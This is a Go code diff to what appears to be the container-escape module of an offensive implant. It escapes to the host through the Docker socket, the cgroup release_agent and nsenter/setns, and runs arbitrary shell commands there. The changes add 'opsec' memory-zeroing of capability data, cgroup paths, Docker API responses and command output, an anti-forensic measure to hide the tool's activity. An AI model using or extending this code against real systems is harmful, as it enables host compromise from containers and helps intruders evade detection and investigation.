@@ -100,6 +100,7 @@ func escapeCheck() (string, string) {
 	privileged := false
 	if data, err := os.ReadFile("/proc/self/status"); err == nil {
 		capEff := parseCapEff(string(data))
+		structs.ZeroBytes(data) // opsec: clear process capability data
 		if isFullCaps(capEff) {
 			sb.WriteString("[!] Full capabilities detected — likely PRIVILEGED container\n")
 			privileged = true
@@ -112,6 +113,7 @@ func escapeCheck() (string, string) {
 		// Check if we can write to cgroup
 		if data, err := os.ReadFile("/proc/1/cgroup"); err == nil {
 			cgroupPath := extractCgroupPath(string(data))
+			structs.ZeroBytes(data) // opsec: clear cgroup path info
 			if cgroupPath != "" {
 				sb.WriteString(fmt.Sprintf("[!] Cgroup path: %s — release_agent escape may be possible\n", cgroupPath))
 				sb.WriteString("    Use: container-escape -action cgroup -command '<cmd>'\n\n")
@@ -298,15 +300,19 @@ func escapeDockerSock(command, image string) (string, string) {
 	sb.WriteString(fmt.Sprintf("[+] Container created: %s\n", containerID))
 
 	// Start container
-	if _, err := dockerAPIPost(client, fmt.Sprintf("/containers/%s/start", containerID), nil); err != nil {
+	if startResp, err := dockerAPIPost(client, fmt.Sprintf("/containers/%s/start", containerID), nil); err != nil {
 		sb.WriteString(fmt.Sprintf("[!] Failed to start container: %v\n", err))
 		return sb.String(), "error"
+	} else {
+		structs.ZeroBytes(startResp) // opsec: clear Docker API response
 	}
 	sb.WriteString("[+] Container started\n")
 
 	// Wait for completion — log error but continue to get logs
-	if _, err := dockerAPIPost(client, fmt.Sprintf("/containers/%s/wait", containerID), nil); err != nil {
+	if waitResp, err := dockerAPIPost(client, fmt.Sprintf("/containers/%s/wait", containerID), nil); err != nil {
 		sb.WriteString(fmt.Sprintf("[!] Wait error (continuing): %v\n", err))
+	} else {
+		structs.ZeroBytes(waitResp) // opsec: clear Docker API wait response
 	}
 
 	// Get logs
@@ -368,6 +374,7 @@ func escapeCgroupNotify(command string) (string, string) {
 				break
 			}
 		}
+		structs.ZeroBytes(data) // opsec: clear cgroup info (may reveal container paths)
 	}
 
 	// Write the release_agent path
@@ -515,6 +522,7 @@ func escapeNsenter(command string) (string, string) {
 		}
 		cmd.Dir = "/"
 		out, err := cmd.CombinedOutput()
+		defer structs.ZeroBytes(out) // opsec: clear command output from memory
 		if err != nil {
 			return fmt.Sprintf("setns failed (%s), chroot fallback also failed: %v\n%s", output, err, string(out)), "error"
 		}
@@ -577,6 +585,7 @@ func nsenterViaSetns(command string) (string, string) {
 	defer cancel()
 	cmd := exec.CommandContext(ctx, "/bin/sh", "-c", command)
 	out, err := cmd.CombinedOutput()
+	defer structs.ZeroBytes(out) // opsec: clear command output from memory
 	if err != nil {
 		return fmt.Sprintf("setns succeeded (%d namespaces) but command failed: %v\n%s", entered, err, string(out)), "error"
 	}
